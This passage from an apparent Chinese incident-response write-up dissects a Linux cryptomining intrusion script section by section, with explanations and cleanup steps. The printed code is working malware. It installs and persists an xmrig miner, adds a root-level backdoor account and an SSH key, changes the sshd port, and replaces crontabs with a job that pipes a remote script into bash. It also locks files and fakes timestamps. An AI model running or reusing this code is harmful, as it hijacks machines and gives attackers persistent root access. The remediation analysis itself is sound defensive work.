+<span class="line"><span>if ! command -v curl &amp;&gt; /dev/null</span></span>
+<span class="line"><span>then</span></span>
+<span class="line"><span>    echo &quot;curl could not be found, will install...&quot;</span></span>
+<span class="line"><span>    apt-get install curl -y</span></span>
+<span class="line"><span>    yum install curl -y</span></span>
+<span class="line"><span>fi</span></span>
+<span class="line"><span>if ! command -v wget &amp;&gt; /dev/null</span></span>
+<span class="line"><span>then</span></span>
+<span class="line"><span>    echo &quot;wget could not be found, will install...&quot;</span></span>
+<span class="line"><span>    apt-get install wget -y</span></span>
+<span class="line"><span>    yum install wget -y</span></span>
+<span class="line"><span>fi</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>if ! type lscpu &gt;/dev/null; then</span></span>
+<span class="line"><span>  echo &quot;WARNING: This script requires \&quot;lscpu\&quot; utility to work correctly&quot;</span></span>
+<span class="line"><span>fi</span></span>
+<span class="line"><span>这段代码用于检查是否安装了名为 lscpu 的命令行工具。如果未安装，脚本将输出警告消息，提醒用户脚本需要该工具才能正常运行。</span></span>
+<span class="line"><span># lscpu -V</span></span>
+<span class="line"><span># lscpu from util-linux 2.23.2</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>if ! sudo -n true 2&gt;/dev/null; then</span></span>
+<span class="line"><span>  echo &quot;Since I can&#39;t do passwordless sudo, mining in background will started from your $RRHOME/.profile file first time you login this host after reboot.&quot;</span></span>
+<span class="line"><span>else</span></span>
+<span class="line"><span>  echo &quot;Mining in background will be performed using moneroocean_miner systemd service.&quot;</span></span>
+<span class="line"><span>fi</span></span>
+<span class="line"><span>这段代码用于检查是否可以进行无密码 sudo，根据结果输出不同的消息。如果无法进行无密码 sudo，则说明后台挖矿将在用户首次登录主机后通过 .profile 文件启动。如果可以进行无密码 sudo，则说明后台挖矿将使用 systemd 服务来执行。</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="解决-5" tabindex="-1"><a class="header-anchor" href="#解决-5"><span>解决</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>无需操作</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="_10-安装挖矿软件" tabindex="-1"><a class="header-anchor" href="#_10-安装挖矿软件"><span>10.安装挖矿软件</span></a></h2><h3 id="恶意代码和解释" tabindex="-1"><a class="header-anchor" href="#恶意代码和解释"><span>恶意代码和解释</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span># start doing stuff: preparing miner</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>echo &quot;[*] Removing previous rr miner (if any)&quot;</span></span>
+<span class="line"><span>if sudo -n true 2&gt;/dev/null; then</span></span>
+<span class="line"><span>  sudo systemctl stop xmrig.service</span></span>
+<span class="line"><span>fi</span></span>
+<span class="line"><span>killall -9 xmrig</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>这段代码用于移除之前可能存在的 RR 矿工（RiskReward 矿工），首先尝试通过无密码 sudo 停止相关的 systemd 服务（如果条件成立），然后通过 killall 命令强制终止 xmrig 进程。</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>echo &quot;[*] Looking for the latest version of Xmrig miner&quot;</span></span>
+<span class="line"><span>LATEST_XMRIG_LINUX_RELEASE=&quot;https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-static-x64.tar.gz&quot;</span></span>
+<span class="line"><span>echo &quot;[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /tmp/xmrig.tar.gz&quot;</span></span>
+<span class="line"><span>if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/xmrig.tar.gz; then</span></span>
+<span class="line"><span>  echo &quot;ERROR: Can&#39;t download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/xmrig.tar.gz&quot;</span></span>
+<span class="line"><span>  exit 1</span></span>
+<span class="line"><span>fi</span></span>
+<span class="line"><span>这段代码用于从指定的链接下载最新版本的 Xmrig 矿工软件，将其保存到临时文件 /tmp/xmrig.tar.gz。如果下载失败，脚本将输出错误消息并终止执行。</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>echo &quot;[*] Unpacking /tmp/xmrig.tar.gz to $RRHOME&quot;</span></span>
+<span class="line"><span>if ! tar xf /tmp/xmrig.tar.gz -C $RRHOME --strip=1; then</span></span>
+<span class="line"><span>  echo &quot;WARNING: Can&#39;t unpack /tmp/xmrig.tar.gz to $RRHOME directory&quot;</span></span>
+<span class="line"><span>fi</span></span>
+<span class="line"><span>rm /tmp/xmrig.tar.gz</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>这段代码用于解压缩下载的 Xmrig 矿工软件并将其放置到指定目录 $RRHOME 中。如果解压缩失败，脚本将输出警告消息。</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>chmod +x $RRHOME/xmrig</span></span>
+<span class="line"><span>chmod +x $RRHOME/config.json</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>echo &quot;[*] Miner $RRHOME/xmrig is OK&quot;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>sed -i &#39;s/&quot;url&quot;: *&quot;[^&quot;]*&quot;,/&quot;url&quot;: &quot;XXX.XXXXXXX.com:5555&quot;,/&#39; $RRHOME/config.json</span></span>
+<span class="line"><span>sed -i &#39;s/&quot;1gb-pages&quot;: *false,/&quot;1gb-pages&quot;: true,/&#39; $RRHOME/config.json</span></span>
+<span class="line"><span>sed -i &#39;s/&quot;algo&quot;: *null,/&quot;algo&quot;: &quot;gr&quot;,/&#39; $RRHOME/config.json</span></span>
+<span class="line"><span>sed -i &#39;s/&quot;tls&quot;: *false,/&quot;tls&quot;: true,/&#39; $RRHOME/config.json</span></span>
+<span class="line"><span>sed -i &#39;s/&quot;keepalive&quot;: *false,/&quot;keepalive&quot;: true,/&#39; $RRHOME/config.json</span></span>
+<span class="line"><span>sed -i &#39;s/&quot;user&quot;: *&quot;[^&quot;]*&quot;,/&quot;user&quot;: &quot;&#39;$WALLET&#39;.0x22&quot;,/&#39; $RRHOME/config.json</span></span>
+<span class="line"><span>sed -i &#39;s/&quot;max-cpu-usage&quot;: *[^,]*,/&quot;max-cpu-usage&quot;: 100,/&#39; $RRHOME/config.json</span></span>
+<span class="line"><span>sed -i &#39;s#&quot;log-file&quot;: *null,#&quot;log-file&quot;: &quot;&#39;$RRHOME/xmrig.log&#39;&quot;,#&#39; $RRHOME/config.json</span></span>
+<span class="line"><span>sed -i &#39;s/&quot;syslog&quot;: *[^,]*,/&quot;syslog&quot;: true,/&#39; $RRHOME/config.json</span></span>
+<span class="line"><span>sed -i &#39;s/&quot;max-threads-hint&quot;: *[^,]*,/&quot;max-threads-hint&quot;: 75,/&#39; $RRHOME/config.json</span></span>
+<span class="line"><span>sed -i &#39;s/&quot;max-threads-hint&quot;: *[^,]*,/&quot;max-threads-hint&quot;: 75,/&#39; $RRHOME/config_background.json</span></span>
+<span class="line"><span># 修改配置文件</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>cp $RRHOME/config.json $RRHOME/config_background.json</span></span>
+<span class="line"><span>sed -i &#39;s/&quot;background&quot;: *false,/&quot;background&quot;: true,/&#39; $RRHOME/config_background.json</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># preparing script</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>echo &quot;[*] Creating $RRHOME/miner.sh script&quot;</span></span>
+<span class="line"><span>cat &gt;$RRHOME/miner.sh &lt;&lt;EOL</span></span>
+<span class="line"><span>#!/bin/bash</span></span>
+<span class="line"><span>if ! pidof xmrig &gt;/dev/null; then</span></span>
+<span class="line"><span>  nice $RRHOME/xmrig \$*</span></span>
+<span class="line"><span>else</span></span>
+<span class="line"><span>  echo &quot;RAPTOREUM miner is already running in the background. Refusing to run another one.&quot;</span></span>
+<span class="line"><span>  echo &quot;Run \&quot;killall xmrig\&quot; or \&quot;sudo killall xmrig\&quot; if you want to remove background miner first.&quot;</span></span>
+<span class="line"><span>fi</span></span>
+<span class="line"><span>EOL</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>chmod +x $RRHOME/miner.sh</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="解决-6" tabindex="-1"><a class="header-anchor" href="#解决-6"><span>解决</span></a></h3><p>这段代码主要是安装 xmrig和修改配置文件</p><h2 id="_11-准备脚本后台运行和重启下工作" tabindex="-1"><a class="header-anchor" href="#_11-准备脚本后台运行和重启下工作"><span>11.准备脚本后台运行和重启下工作</span></a></h2><h3 id="恶意代码和解释-1" tabindex="-1"><a class="header-anchor" href="#恶意代码和解释-1"><span>恶意代码和解释</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span># preparing script background work and work under reboot</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>if ! sudo -n true 2&gt;/dev/null; then</span></span>
+<span class="line"><span>  if ! grep miner.sh $RRHOME/.profile &gt;/dev/null; then</span></span>
+<span class="line"><span>    echo &quot;[*] Adding $RRHOME/miner.sh script to $RRHOME/.profile&quot;</span></span>
+<span class="line"><span>    echo &quot;$RRHOME/miner.sh --config=$RRHOME/config_background.json &gt;/dev/null 2&gt;&amp;1&quot; &gt;&gt;$RRHOME/.profile</span></span>
+<span class="line"><span>  else </span></span>
+<span class="line"><span>    echo &quot;Looks like $RRHOME/miner.sh script is already in the $RRHOME/.profile&quot;</span></span>
+<span class="line"><span>  fi</span></span>
+<span class="line"><span>  echo &quot;[*] Running miner in the background (see logs in $RRHOME/xmrig.log file)&quot;</span></span>
+<span class="line"><span>  /bin/bash $RRHOME/miner.sh --config=$RRHOME/config_background.json &gt;/dev/null 2&gt;&amp;1</span></span>
+<span class="line"><span>else</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>  if [[ $(grep MemTotal /proc/meminfo | awk &#39;{print $2}&#39;) -gt 3500000 ]]; then</span></span>
+<span class="line"><span>    echo &quot;[*] Enabling huge pages&quot;</span></span>
+<span class="line"><span>    echo &quot;vm.nr_hugepages=$((1168+$(nproc)))&quot; | sudo tee -a /etc/sysctl.conf</span></span>
+<span class="line"><span>    sudo sysctl -w vm.nr_hugepages=$((1168+$(nproc)))</span></span>
+<span class="line"><span>  fi</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>  if ! type systemctl &gt;/dev/null; then</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    echo &quot;[*] Running miner in the background (see logs in $RRHOME/xmrig.log file)&quot;</span></span>
+<span class="line"><span>    /bin/bash $RRHOME/miner.sh --config=$RRHOME/config_background.json &gt;/dev/null 2&gt;&amp;1</span></span>
+<span class="line"><span>    echo &quot;ERROR: This script requires \&quot;systemctl\&quot; systemd utility to work correctly.&quot;</span></span>
+<span class="line"><span>    echo &quot;Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible.&quot;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>  else</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    echo &quot;[*] Creating rr_miner systemd service&quot;</span></span>
+<span class="line"><span>    cat &gt;/tmp/xmrig.service &lt;&lt;EOL</span></span>
+<span class="line"><span>[Unit]</span></span>
+<span class="line"><span>Description=RTM miner service</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[Service]</span></span>
+<span class="line"><span>ExecStart=$RRHOME/xmrig --config=$RRHOME/config.json</span></span>
+<span class="line"><span>Restart=always</span></span>
+<span class="line"><span>Nice=10</span></span>
+<span class="line"><span>CPUWeight=1</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[Install]</span></span>
+<span class="line"><span>WantedBy=multi-user.target</span></span>
+<span class="line"><span>EOL</span></span>
+<span class="line"><span>    sudo mv /tmp/xmrig.service /etc/systemd/system/xmrig.service</span></span>
+<span class="line"><span>    echo &quot;[*] Starting rr_miner systemd service&quot;</span></span>
+<span class="line"><span>    sudo killall xmrig 2&gt;/dev/null</span></span>
+<span class="line"><span>    sudo systemctl daemon-reload</span></span>
+<span class="line"><span>    sudo systemctl enable xmrig.service</span></span>
+<span class="line"><span>    sudo systemctl start xmrig.service</span></span>
+<span class="line"><span>    echo &quot;To see miner service logs run \&quot;sudo journalctl -u rr_miner -f\&quot; command&quot;</span></span>
+<span class="line"><span>  fi</span></span>
+<span class="line"><span>fi</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>echo &quot;&quot;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>这段代码用于配置并准备矿工的后台工作，并根据系统环境和条件启动矿工服务。如果可以进行无密码 sudo，脚本会尝试将矿工脚本添加到用户的 .profile 文件中，并在后台运行矿工。如果系统内存足够大，脚本会启用大页面。如果不支持 systemctl，脚本会尝试在后台运行矿工。如果支持 systemctl，脚本会创建并启动 xmrig.service systemd 服务。</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="解决-7" tabindex="-1"><a class="header-anchor" href="#解决-7"><span>解决：</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>rm -rf /etc/systemd/system/xmrig.service</span></span>
+<span class="line"><span>systemctl status xmrig.service</span></span>
+<span class="line"><span>systemctl disable xmrig.service</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_12-设置ssh登录" tabindex="-1"><a class="header-anchor" href="#_12-设置ssh登录"><span>12.设置ssh登录</span></a></h2><h3 id="恶意代码和解释-2" tabindex="-1"><a class="header-anchor" href="#恶意代码和解释-2"><span>恶意代码和解释</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>#setup ssh</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>RSAKEY=&quot;ssh-rsa XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX wolf@wolfs-MacBook-Pro.local&quot; # 参数做了处理</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>grep -q nobodymm /etc/passwd || chattr -ia /etc/passwd; </span></span>
+<span class="line"><span>grep -q nobodymm /etc/passwd || echo &#39;nobodymm:x:0:0:root:/root:/bin/bash&#39; &gt;&gt; /etc/passwd; chattr +ia /etc/passwd</span></span>
+<span class="line"><span>grep -q nobodymm /etc/shadow || chattr -ia /etc/shadow; </span></span>
+<span class="line"><span>grep -q nobodymm /etc/shadow || echo &#39;nobodymm:XXXXXXXXX:19237:0:14600:14:::&#39; &gt;&gt; /etc/shadow; chattr +ia /etc/shadow</span></span>
+<span class="line"><span>grep -q nobodymm /etc/sudoers || chattr -ia /etc/sudoers; </span></span>
+<span class="line"><span>grep -q nobodymm /etc/sudoers || echo &#39;nobodymm  ALL=(ALL:ALL) ALL&#39; &gt;&gt; /etc/sudoers; chattr +i /etc/sudoers</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>这段代码旨在确保名为 nobodymm 的用户存在于系统中，并且在 /etc/passwd、/etc/shadow 和 /etc/sudoers 文件中进行了相应的修改和保护。这可能是一种尝试在系统中添加特定用户并修改权限的脚本片段，但代码片段本身不提供足够的上下文以完全理解其用途。</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>mkdir /run/network/.ssh/ -p  </span></span>
+<span class="line"><span>touch /run/network/.ssh/authorized_keys  </span></span>
+<span class="line"><span>chmod 600 /run/network/.ssh/authorized_keys</span></span>
+<span class="line"><span>grep -q wolf@wolfs-MacBook-Pro.local /run/network/.ssh/authorized_keys || chattr -ia /run/network/.ssh/authorized_keys; </span></span>
+<span class="line"><span>grep -q wolf@wolfs-MacBook-Pro.local /run/network/.ssh/authorized_keys || echo $RSAKEY &gt; /run/network/.ssh/authorized_keys; chattr +ia /run/network/.ssh/authorized_keys; </span></span>
+<span class="line"><span>mkdir /root/.ssh/ -p  </span></span>
+<span class="line"><span>touch /root/.ssh/authorized_keys  </span></span>
+<span class="line"><span>chmod 600 /root/.ssh/authorized_keys</span></span>
+<span class="line"><span>grep -q wolf@wolfs-MacBook-Pro.local /root/.ssh/authorized_keys || chattr -ia /root/.ssh/authorized_keys; </span></span>
+<span class="line"><span>grep -q wolf@wolfs-MacBook-Pro.local /root/.ssh/authorized_keys || echo $RSAKEY &gt;&gt; /root/.ssh/authorized_keys; chattr +ia /root/.ssh/authorized_keys</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>这段代码旨在将一个特定的 SSH 公钥添加到系统中，以实现免密码登录。它在 /run/network/.ssh/authorized_keys 和 /root/.ssh/authorized_keys 文件中添加该公钥，并将这些文件设置为不可变属性，以防止进一步更改。</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="解决方法-1" tabindex="-1"><a class="header-anchor" href="#解决方法-1"><span>解决方法</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>chattr -ia /etc/passwd</span></span>
+<span class="line"><span>chattr -ia /etc/shadow</span></span>
+<span class="line"><span>chmod 644  /etc/shadow</span></span>
+<span class="line"><span>chattr -ia /etc/sudoers</span></span>
+<span class="line"><span>再修改</span></span>
+<span class="line"><span>vi /etc/passwd</span></span>
+<span class="line"><span>删除：nobodymm:x:0:0:root:/root:/bin/bash</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>vi /etc/shadow</span></span>
+<span class="line"><span>删除： nobodymm:XXXXXXXXX:19237:0:14600:14:::</span></span>
+<span class="line"><span>chmod 000 /etc/shadow</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>chmod 644  /etc/sudoers</span></span>
+<span class="line"><span>vi /etc/sudoers</span></span>
+<span class="line"><span>删除： nobodymm  ALL=(ALL:ALL) ALL</span></span>
+<span class="line"><span>chmod 440  /etc/sudoers</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span></span></span>
+<span class="line"><span>rm -rf  /run/network</span></span>
+<span class="line"><span>chattr -ia /root/.ssh/authorized_keys</span></span>
+<span class="line"><span>vi /root/.ssh/authorized_keys;</span></span>
+<span class="line"><span>删除密钥</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_13-修改-sshd-config-远程登录端口" tabindex="-1"><a class="header-anchor" href="#_13-修改-sshd-config-远程登录端口"><span>13.修改 sshd_config 远程登录端口</span></a></h2><h3 id="恶意代码和解释-3" tabindex="-1"><a class="header-anchor" href="#恶意代码和解释-3"><span>恶意代码和解释</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>grep -q 11222 /etc/ssh/sshd_config || echo &quot;Port 22&quot; &gt;&gt; /etc/ssh/sshd_config</span></span>
+<span class="line"><span>grep -q 11222 /etc/ssh/sshd_config || echo &quot;Port 11222&quot; &gt;&gt; /etc/ssh/sshd_config</span></span>
+<span class="line"><span>echo &quot;Protocol 2&quot; &gt;&gt; /etc/ssh/sshd_config </span></span>
+<span class="line"><span>echo &quot;ListenAddress 0.0.0.0&quot; &gt;&gt; /etc/ssh/sshd_config </span></span>
+<span class="line"><span>echo &quot;RSAAuthentication yes&quot; &gt;&gt; /etc/ssh/sshd_config </span></span>
+<span class="line"><span>echo &quot;PubkeyAuthentication yes&quot; &gt;&gt; /etc/ssh/sshd_config </span></span>
+<span class="line"><span>echo &quot;AuthorizedKeysFile  .ssh/authorized_keys&quot; &gt;&gt; /etc/ssh/sshd_config </span></span>
+<span class="line"><span>sudo systemctl restart sshd </span></span>
+<span class="line"><span>touch -d 20180409 /etc/ssh/sshd_config </span></span>
+<span class="line"><span>chattr +ia /etc/ssh/sshd_config </span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>这段代码用于修改 SSH 服务器的配置文件，设置监听端口、协议版本、监听地址、身份验证等选项，并确保配置文件被修改时间锁定以及不可更改。</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="解决方法-2" tabindex="-1"><a class="header-anchor" href="#解决方法-2"><span>解决方法</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>chattr -ia /etc/ssh/sshd_config</span></span>
+<span class="line"><span>vi /etc/ssh/sshd_config </span></span>
+<span class="line"><span>删除新增的字段</span></span>
+<span class="line"><span>Port 22</span></span>
+<span class="line"><span>Port 11222</span></span>
+<span class="line"><span>Protocol 2</span></span>
+<span class="line"><span>ListenAddress 0.0.0.0</span></span>
+<span class="line"><span>RSAAuthentication yes</span></span>
+<span class="line"><span>PubkeyAuthentication yes</span></span>
+<span class="line"><span>AuthorizedKeysFile  .ssh/authorized_keys</span></span>
+<span class="line"><span>都是删掉保存</span></span>
+<span class="line"><span>systemctl restart sshd </span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>已经在最开始的时候操作了</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="_14-修改定时任务" tabindex="-1"><a class="header-anchor" href="#_14-修改定时任务"><span>14.修改定时任务</span></a></h2><h3 id="恶意代码和解释-4" tabindex="-1"><a class="header-anchor" href="#恶意代码和解释-4"><span>恶意代码和解释</span></a></h3><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-"><span class="line"><span>chattr -R -ia /var/spool/cron </span></span>
+<span class="line"><span>chattr -ia /etc/crontab </span></span>
+<span class="line"><span>chattr -R -ia /etc/cron.d </span></span>
+<span class="line"><span>chattr -R -ia /var/spool/cron/crontabs </span></span>
+<span class="line"><span>crontab -r</span></span>
+<span class="line"><span>rm -rf /var/spool/cron/*</span></span>
+<span class="line"><span>rm -rf /etc/cron.d/*</span></span>
+<span class="line"><span>rm -rf /var/spool/cron/crontabs</span></span>
+<span class="line"><span>rm -rf /etc/crontab</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>crontab -l 2&gt;/dev/null</span></span>
+<span class="line"><span>echo &quot;*/30 * * * * root curl -fsSL http://XX.XX.XX.XX/php/php_8020.sh | bash &quot; &gt;&gt; /etc/crontab</span></span>
+<span class="line"><span>echo &quot;*/30 * * * * root cd1 -fsSL http://XX.XX.XX.XX/php/php_8020.sh | bash &quot; &gt;&gt; /etc/crontab</span></span>
+<span class="line"><span>echo crontab created</span></span>
+<span class="line"><span>touch -d 20180515 /etc/crontab</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>chattr -R +ia /var/spool/cron</span></span>
+<span class="line"><span>chattr +ia /etc/crontab</span></span>
+<span class="line"><span>chattr -R +ia /var/spool/cron/crontabs</span></span>
+<span class="line"><span>chattr -R +ia /etc/cron.d</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>touch -d 20151212 /etc/.system</span></span>
+<span class="line"><span></span></span>
